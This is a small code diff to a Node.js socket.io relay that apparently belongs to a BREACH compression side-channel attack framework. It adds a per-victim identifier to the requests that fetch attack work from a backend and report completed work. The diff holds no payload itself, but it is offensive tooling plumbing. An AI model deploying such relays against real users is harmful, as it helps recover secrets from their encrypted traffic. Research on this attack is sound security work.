@@ -1,6 +1,7 @@
 const io = require('socket.io'),
       winston = require('winston'),
-      http = require('http');
+      http = require('http'),
+      config = require('./config.js');
 
 winston.remove(winston.transports.Console);
 winston.add(winston.transports.Console, {'timestamp': true});
@@ -22,7 +23,7 @@ socket.on('connection', function(client) {
         var getWorkOptions = {
             host: BACKEND_HOST,
             port: BACKEND_PORT,
-            path: '/breach/get_work'
+            path: '/breach/get_work/' + config.victim_id
         };
 
         http.request(getWorkOptions, function(response) {
@@ -51,7 +52,7 @@ socket.on('connection', function(client) {
         var workCompletedOptions = {
             host: BACKEND_HOST,
             port: BACKEND_PORT,
-            path: '/breach/work_completed',
+            path: '/breach/work_completed/' + config.victim_id,
             method: 'POST',
             json: requestBody
         };
